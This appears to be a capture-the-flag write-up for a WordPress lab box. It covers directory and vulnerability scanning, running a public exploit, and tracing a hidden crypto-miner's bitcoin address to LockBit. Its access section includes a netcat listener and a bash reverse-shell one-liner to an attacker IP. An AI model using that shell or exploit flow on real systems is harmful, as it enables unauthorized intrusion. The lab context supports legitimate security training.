
## *Enumeration*
>	- Using `gobuster -u https://10.10.141.118/ -k -w /usr/share/wordlists/dirb/common.txt` to get hidden directories.
>		- `-k` to not check for certificates.
>	- ![](gobuster-out.png)
>	- The website uses WordPress, use `wpscan --url https://bricks.thm/ --disable-tls-checks` to check for vulnerabilities. ![](wp-scan-1.png)![](wp-scan-2.png)
>	- The version is found `1.9.5`, searching online for a vulnerability for WordPress version 1.9.5.![](wp-vuln.png)
## *Gaining Access*
>	- Cloning the repository and installing the requirements.
>	- Using `python exploit.py -u https://bricks.thm/` to run the exploit.![](gained-access.png)
>	- Run a listener using `nc -lvnp 4444` and upgrade the shell from the target machine using `bash -c 'exec bash -i &>/dev/tcp/10.9.224.110/4444 <&1'`.![](reverse-shell.png)
>	- The hidden file can be found.![](hidden-file.png)
## *Enumeration v2*
>	- Checking running processes using `systemctl list-units --type=service --state=running`.![](running-proc.png)
>	- The `ubuntu.service` that got a description of `TRYHACK3M` is obviously suspicious.
>	- Checking the service using `systemctl cat ubuntu.service`.![](sus-service.png)
>	- The service is executing from the `/lib/NetworkManager/` directory. Checking the directory.![](net-man.png)
>	- The file `inet.conf` has read only permissions, `cat`ing the file.![](sus-file.png)
>	- The miner file is found, checking the ID in Cyber Chef.![](id-decoded.png)
>	- Since bitcoin address are 26 and 62 alphanumeric characters. The decoded address `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` is more than that.
>	- Examining the address, it seems to be duplicated.![](dup-add.png)
>	- Going to a bitcoin trading website to check the address.![[blockchain-add.png]]
>	- Checking the transactions with low Privacy, the last one shows the sender and receiver.![](bitcoin-transaction.png)
>	- Checking the sender's address with a google search.![](lockbit-grp.png)
>	- The LockBit Ransomware Group is the affiliated group.